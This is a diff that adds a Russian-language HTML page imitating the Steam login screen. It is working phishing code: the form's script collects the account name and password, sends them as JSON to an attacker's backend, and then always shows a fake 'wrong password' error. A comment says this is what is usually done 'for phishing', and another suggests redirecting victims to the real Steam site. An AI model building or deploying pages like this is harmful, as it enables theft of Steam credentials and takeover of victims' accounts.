@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+    <html lang="ru">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Войти в Steam</title>
+        <link rel="stylesheet" href="steam_phisch_style.css">
+        <!-- Добавьте Motiva Sans или используйте системные шрифты, если Motiva недоступна -->
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+        <style>
+            /* Fallback font for Motiva Sans if not loaded */
+            body { font-family: "Inter", Arial, Helvetica, sans-serif; }
+        </style>
+    </head>
+    <body>
+        <div class="login_container">
+            <h2>Войти в Steam</h2>
+            <form id="steamLoginForm" action="/login" method="POST"> <!-- Action will be your backend endpoint -->
+                <div class="form_group">
+                    <label for="username">Имя аккаунта Steam</label>
+                    <input type="text" id="username" name="username" required>
+                </div>
+                <div class="form_group">
+                    <label for="password">Пароль</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                <div class="remember_me">
+                                        <input type="checkbox" id="remember_me" name="remember_me">
+                    <label for="remember_me">Запомнить меня</label>
+                </div>
+                <button type="submit" class="login_btn">Войти</button>
+                <div class="error_message" id="errorMessage">Неверное имя аккаунта или пароль.</div>
+            </form>
+            <div class="login_links">
+                <a href="#">Забыли пароль?</a>
+                <span class="separator">|</span>
+                <a href="#">Помощь</a>
+            </div>
+            <div class="join_steam_wrapper">
+                <p>Ещё нет аккаунта Steam?</p>
+                <a href="#" class="join_steam_btn">Присоединиться к Steam</a>
+            </div>
+        </div>
+
+        <script>
+            // JavaScript для имитации задержки и отображения ошибки
+            document.getElementById('steamLoginForm').addEventListener('submit', function(event) {
+                event.preventDefault(); // Предотвращаем стандартную отправку формы
+
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+                const errorMessage = document.getElementById('errorMessage');
+
+                // Имитация загрузки
+                const loginButton = document.querySelector('.login_btn');
+                loginButton.textContent = 'Вход...';
+                loginButton.disabled = true;
+                errorMessage.style.display = 'none';
+
+                // Отправка данных на ваш бэкэнд
+                fetch(this.action, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ username: username, password: password })
+                })                .then(response => response.json()) // или response.text() в зависимости от вашего бэкэнда
+                .then(data => {
+                    // Здесь вы можете обработать ответ от бэкэнда.
+                    // Для фишинга, обычно, мы всегда показываем ошибку или перенаправляем.
+                    console.log('Данные отправлены:', data);
+
+                    // Имитация задержки и показ ошибки
+                    setTimeout(() => {
+                        errorMessage.style.display = 'block'; // Показываем ошибку
+                        loginButton.textContent = 'Войти';
+                        loginButton.disabled = false;
+                        // Можно также перенаправить пользователя на другую страницу или на оригинальный Steam
+                        // window.location.href = 'https://store.steampowered.com/login/';
+                    }, 1500); // Задержка 1.5 секунды
+                })
+                .catch((error) => {
+                    console.error('Ошибка при отправке данных:', error);
+                    // В случае ошибки сети, также показать ошибку пользователю
+                    setTimeout(() => {
+                        errorMessage.textContent = 'Произошла ошибка сети. Попробуйте снова.';
+                        errorMessage.style.display = 'block';
+                        loginButton.textContent = 'Войти';
+                        loginButton.disabled = false;
+                    }, 1500);
+                });
+            });
+        </script>
+    </body>
+    </html>
